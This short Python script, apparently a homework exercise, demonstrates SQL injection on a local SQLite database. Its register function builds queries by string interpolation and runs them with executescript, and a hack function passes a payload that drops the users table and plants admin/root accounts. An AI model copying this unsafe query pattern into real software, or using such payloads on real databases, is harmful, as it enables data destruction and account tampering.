import sqlite3


def register(username: str, password: str) -> None:
    with sqlite3.connect('../homework.db') as conn:
        cursor = conn.cursor()
        cursor.executescript(
            f"""
            INSERT INTO `table_users` (username, password)
            VALUES ('{username}', '{password}')  
            """
        )
        conn.commit()


def hack() -> None:

    username: str = """i_like', '1234'); DROP TABLE IF EXISTS `table_users`;CREATE TABLE `table_users_fake`(
                        id INTEGER PRIMARY KEY,
                        username VARCHAR(255) NOT NULL,
                        password VARCHAR(255) NOT NULL
                    ); INSERT INTO `table_users_fake` (username, password)
                                VALUES ('admin', 'admin'), ('root', 'root') --"""
    password: str = ''
    register(username, password)


if __name__ == '__main__':
    register('wignorbo', 'sjkadnkjasdnui31jkdwq')
    hack()
